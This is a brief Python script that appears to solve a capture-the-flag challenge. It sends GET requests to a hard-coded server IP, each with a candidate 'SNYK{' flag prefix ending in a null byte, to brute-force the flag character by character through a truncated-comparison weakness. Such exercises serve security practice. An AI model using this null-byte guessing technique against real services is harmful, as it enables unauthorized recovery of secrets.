import requests
import string

charset = string.digits + string.ascii_lowercase + string.ascii_uppercase + '_}{'
url = 'http://35.211.157.218:8000'
  
def check(f):
	flag = f'SNYK{{{f}\x00'
	params = {'flag': flag}
	r = requests.get(url=url, params=params)
	print(flag, '=>', r.text.strip())

for c in charset:
	check(c)